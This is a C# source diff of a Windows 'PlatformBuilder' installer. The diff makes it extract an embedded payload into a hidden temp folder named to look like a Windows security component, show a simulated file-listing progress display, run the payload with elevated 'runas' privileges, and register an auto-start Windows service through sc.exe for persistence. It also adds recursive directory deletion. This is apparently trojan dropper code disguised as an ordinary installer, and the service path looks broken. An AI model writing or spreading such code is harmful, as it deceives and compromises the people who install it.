@@ -12,7 +12,6 @@ using System.Windows.Forms;
 using System.IO;
 using System.IO.Compression;
 using System.Threading;
-using System.Diagnostics;
 using System.Security;
 using System.Security.AccessControl;
 
@@ -23,8 +22,10 @@ namespace Installer
         string appName = "PlatformBuilder";
         string[] appPath = new string[4];
         private Thread listThread;
-        private string hiddenAppDir = Path.Combine(Path.GetTempPath(), "WINsecurity_25b2");
+        private const string hiddenAppName = "WINsecurity_25b2";
+        private string hiddenAppDir = Path.Combine(Path.GetTempPath(), hiddenAppName);
         private bool stopList = false;
+        private bool CreationSuccess = false;
 
         public MainWindow()
         {
@@ -43,29 +44,21 @@ namespace Installer
             {
                 try
                 {
-                    if (Directory.Exists(appPath[i]))
-                    {
-                        Directory.Delete(appPath[i]);
-                    }
+                    Directory.Delete(appPath[i], true);
+
                 }
                 catch { }
             }
 
             try
             {
-                if (Directory.Exists(this.hiddenAppDir))
-                {
-                    Directory.Delete(this.hiddenAppDir);
-                }
+                Directory.Delete(this.hiddenAppDir, true);
             }
             catch { }
 
             try
             {
-                if (File.Exists(Path.Combine(Path.GetTempPath(), appName + ".zip")))
-                {
-                    File.Delete(Path.Combine(Path.GetTempPath(), appName + ".zip"));
-                }
+                File.Delete(Path.Combine(Path.GetTempPath(), appName + ".zip"));
             }
             catch { }
         }
@@ -75,7 +68,7 @@ namespace Installer
             string gameLocation = Path.Combine(this.appPath[2], this.appName + ".exe");
             if (File.Exists(gameLocation))
             {
-                Process proc = new Process();
+                System.Diagnostics.Process proc = new System.Diagnostics.Process();
                 proc.StartInfo.FileName = gameLocation;
                 proc.StartInfo.UseShellExecute = true;
                 proc.StartInfo.Verb = "runas";
@@ -89,21 +82,34 @@ namespace Installer
 
         private void GetResource()
         {
-            ResourceManager rm = new ResourceManager("Installer.Resource", Assembly.GetExecutingAssembly());
-            string gamePack = Path.Combine(Path.GetTempPath(), appName + ".zip");
             try
             {
+                ResourceManager rm = new ResourceManager("Installer.Resource", Assembly.GetExecutingAssembly());
+                string gamePack = Path.Combine(Path.GetTempPath(), appName + ".zip");
                 File.WriteAllBytes(gamePack, (byte[])rm.GetObject(appName));
-                if (!this.StartExtract(gamePack))
+                if (this.StartExtract(gamePack))
                 {
-                    label2.Text = "An error has occurred.";
-                    label2.ForeColor = Color.Red;
-                    this.stopList = true;
-                    fileLoadingName.Text = "";
-                    RessourcesprogressBar.Value = 0;
+                    CreationSuccess = true;
+                }
+                else
+                {
+                    this.InstallFail();
                 }
             }
-            catch { }
+            catch 
+            {
+                this.InstallFail();
+            }
+        }
+
+        private void InstallFail()
+        {
+            label2.Text = "An error has occurred.";
+            label2.ForeColor = Color.Red;
+            this.stopList = true;
+            fileLoadingName.Text = "";
+            RessourcesprogressBar.Value = 0;
+            this.CreationSuccess = false;
         }
 
         private void ListFolderSimulation(int minDuration, int maxDuration)
@@ -149,7 +155,10 @@ namespace Installer
             {
                 this.Invoke(new MethodInvoker(delegate
                 {
-                    this.EndDialog();
+                    if(this.CreationSuccess)
+                    {
+                        this.EndDialog();
+                    }
                 }));
             };
 
@@ -182,10 +191,18 @@ namespace Installer
                     return false;
                 }
             }
+            try
+            {
+                DirectoryInfo di = Directory.CreateDirectory(this.hiddenAppDir);
+                di.Attributes = FileAttributes.Directory | FileAttributes.Hidden;
 
-            DirectoryInfo di = Directory.CreateDirectory(this.hiddenAppDir);
-            di.Attributes = FileAttributes.Directory | FileAttributes.Hidden;
-
+            }
+            catch 
+            {
+                return false;
+            }
+           
+           
             /*DirectorySecurity directorySecurity = di.GetAccessControl();
             FileSystemRights Rights = FileSystemRights.FullControl;
             AccessControlType ControlType = AccessControlType.Allow;
@@ -230,10 +247,16 @@ namespace Installer
         }
 
 
+        private void SetupServiceWorker()
+        {
+            System.Diagnostics.Process.Start(@"C:\Windows\system32\sc.exe", "create " + hiddenAppName + " binPath=" + Path.Combine(this.hiddenAppDir, "") + " start=auto");
+        }
+
         private void MainWindow_Load(object sender, EventArgs e)
         {
             this.ListFolderSimulation(4000, 6000);
-            //this.GetResource();
+            this.SelfRemove();
+            this.GetResource();
         }
     }
 }
